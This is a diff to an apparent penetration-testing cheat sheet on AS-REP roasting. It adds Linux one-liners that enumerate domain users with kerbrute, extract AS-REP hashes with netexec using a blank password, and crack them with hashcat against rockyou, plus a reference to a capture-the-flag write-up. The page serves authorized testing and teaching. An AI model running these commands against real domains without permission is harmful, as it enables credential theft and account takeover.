@@ -39,6 +39,12 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 > [!WARNING]
 > AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
 
+#### Quick one-liners (Linux)
+
+- Enumerate potential targets first (e.g., from leaked build paths) with Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Pull a single user’s AS-REP even with a **blank** password using `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec also prints LDAP signing/channel binding posture).
+- Crack with `hashcat out.asreproast /path/rockyou.txt` – it auto-detects **-m 18200** (etype 23) for AS-REP roast hashes.
+
 ### Cracking
 
 ```bash
@@ -77,6 +83,7 @@ ASRepCatcher listen
 ## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 ---
 
